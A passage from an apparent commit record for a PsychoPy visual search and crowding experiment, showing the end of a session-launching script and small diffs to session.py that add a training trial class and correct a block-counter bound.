ses-%s'%(exp_type, sj_num, ses_num))\n\n    # make output dir\n    base_dir = op.split(os.getcwd())[0] # main path for all folders of project\n    output_dir = op.join(base_dir,'output','sourcedata', 'sub-{sj}'.format(sj=sj_num))\n\n    # if output path doesn't exist, create it\n    if not op.isdir(output_dir): \n        os.makedirs(output_dir)\n    print('saving files in %s'%output_dir)\n\n    # string for output data\n    output_str = 'sub-{sj}_ses-{ses}_task-{task}'.format(sj = sj_num, ses = ses_num, task = tasks[exp_type])\n\n    # if file already exists\n    behav_file = op.join(output_dir,'{behav}_events.tsv'.format(behav=output_str))\n    if op.exists(behav_file): \n        print('file already exists!')\n\n        overwrite = ''\n        while overwrite not in ('y','yes','n','no'):\n            overwrite = input('overwrite %s\\n(y\/yes\/n\/no)?: '%behav_file)\n\n        if overwrite in ['no','n']:\n            raise NameError('Run %s already in directory\\nstopping experiment!'%behav_file)\n\n\n    # load approriate class object to be run\n    if exp_type == 'search': # run standard pRF mapper\n\n        exp_sess = VsearchSession(output_str = output_str,\n                              output_dir = output_dir,\n                              settings_file = 'experiment_settings.yml',\n                              eyetracker_on = False) #True)\n\n    elif exp_type == 'crowding': # run feature pRF mapper\n         exp_sess = CrowdingSession(output_str = output_str,\n                                  output_dir = output_dir,\n                                  settings_file = 'experiment_settings.yml',\n                                  eyetracker_on = False) #True)\n\n   \t                            \n    exp_sess.run()\n\n\nif __name__ == '__main__':\n    main()"},"\/experiment\/session.py":{"changes":[{"diff":"\n \n from exptools2.core import Session, PylinkEyetrackerSession\n \n-from trial import VsearchTrial, CrowdingTrial \n+from trial import VsearchTrial, CrowdingTrial, TrainCrowdingTrial\n from stim import VsearchStim, CrowdingStim \n \n from psychopy import visual, tools\n","add":1,"remove":1,"filename":"\/experiment\/session.py","badparts":["from trial import VsearchTrial, CrowdingTrial "],"goodparts":["from trial import VsearchTrial, CrowdingTrial, TrainCrowdingTrial"]},{"diff":"\n                                 self.settings['crowding']['iti']\n                                 ])\n \n-                if blk_counter < self.settings['crowding']['num_blks']: \n+                if blk_counter < self.settings['crowding']['num_blks'] - 1: \n                     blk_counter += 1\n \n             else:\n","add":1,"remove":1,"filename":"\/experiment\/session.py","badparts":["                if blk_counter < self.settings['crowding']['num_blks']: "],"goodparts":["                if blk_counter < self.settings['crowding']['num_blks'] - 1: "]},{"diff":"\n \n from exptools2.core import Session, PylinkEyetrackerSession\n \n-from trial import VsearchTrial, CrowdingTrial \n+from trial import VsearchTrial, CrowdingTrial, TrainCrowdingTrial\n from stim import VsearchStim, CrowdingStim \n \n from psychopy import visual, tools\n","add":1,"remove":1,"filename":"\/experiment\/session.py","badparts":["from trial import VsearchTrial, CrowdingTrial "],"goodparts":["from trial import VsearchTrial, CrowdingTrial, TrainCrowdingTrial"]},{"diff":"\n                                 self.settings['crowding']['iti']\n                                 ])\n \n-                if blk_counter < self.settings['crowding']['num_blks']: \n+                if blk_counter < self.settings['crowding']['num_blks'] - 1: \n                     blk_counter += 1\n \n             else:\n","add":1,"remove":1,"filename":"\/experiment\/session.py","badparts":["                if blk_counter < self.settings['crowding']['num_blks']: "],"goodparts":["                if blk_counter < self.settings['crowding']['num_blks'] - 1: "]}]}},"msg":"added training session for crowding, need to give feedback on fixation cross and check for fixations"}}}